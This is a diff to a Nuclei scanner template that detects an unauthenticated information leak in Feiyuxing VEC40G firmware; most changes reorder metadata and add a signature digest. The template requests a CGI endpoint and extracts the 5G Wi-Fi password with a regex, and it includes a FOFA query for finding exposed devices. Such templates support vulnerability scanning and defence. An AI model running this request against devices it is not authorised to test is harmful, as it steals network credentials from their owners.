@@ -1,5 +1,4 @@
 id: feiyuxing-info-leak
-
 info:
   name: Feiyuxing Information - Exposure
   author: SleepingBag945
@@ -13,29 +12,26 @@ info:
   classification:
     cpe: cpe:2.3:o:feiyuxing:vec40g_firmware:*:*:*:*:*:*:*:*
   metadata:
-    verified: "true"
-    max-request: 1
-    vendor: feiyuxing
-    product: vec40g_firmware
     fofa-query: title="飞鱼星企业级智能上网行为管理系统"
-  tags: misconfig,exposure,iot,wpa,wpa2,vuln
-
+    max-request: 1
+    product: vec40g_firmware
+    vendor: feiyuxing
+    verified: "true"
+  tags: exposure,iot,misconfig,vuln,wpa,wpa2
 http:
   - method: GET
     path:
       - "{{BaseURL}}/request_para.cgi?parameter=wifi_get_5g_host"
-
     matchers:
       - type: dsl
         dsl:
           - 'status_code == 200'
           - 'contains(body,"WPA2-PSK") || contains(body,"WPA-PSK")'
         condition: and
-
     extractors:
       - type: regex
         part: body
         group: 1
         regex:
           - "\"wl_passwd_5g\":\"(.*?)\""
-
+        # digest: 490a00463044022017919498f92b24efb5320d3bc8ca74e3889dbe2550fc835aa4e0fbdf983a655202202b1c378f8e7d3eb51bb86bf13b77bd040964ff3842a380aa4c4d39525d2a6788:922c64590222798bb761d5b6d8e72950
